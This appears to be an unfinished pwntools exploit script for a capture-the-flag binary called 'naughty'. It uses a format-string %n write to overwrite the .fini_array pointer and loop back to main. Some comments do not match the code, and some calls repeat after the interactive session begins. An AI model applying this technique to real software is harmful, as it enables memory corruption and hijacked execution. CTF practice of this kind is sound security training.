from pwn import *

#context.update(log_level='debug')
p = process('naughty')
#p = remote('p1.tjctf.org', 8004)
p.recvuntil('name?')

e = ELF('naughty')
offset_toPointer = 0x30

addr_fini = 0x8049bc4
addr_main = 0x8048536

#stage 1, leak libc and recall main
payload = '%{}x%{}$n'.format(addr_main, offset_toPointer/4)
payload += 'aaaa'+p32(addr_fini) + 'ccc'
#raw_input('pid: ' + str(p.pid))
p.sendline(payload)

p.recvuntil('___   \n');

#stage 2, 
print p.recvuntil('name?')
p.sendline(payload)

p.recvrepeat(2)
p.interactive()
p.recvuntil('___   \n');

print p.recvuntil('name?')
p.interactive()
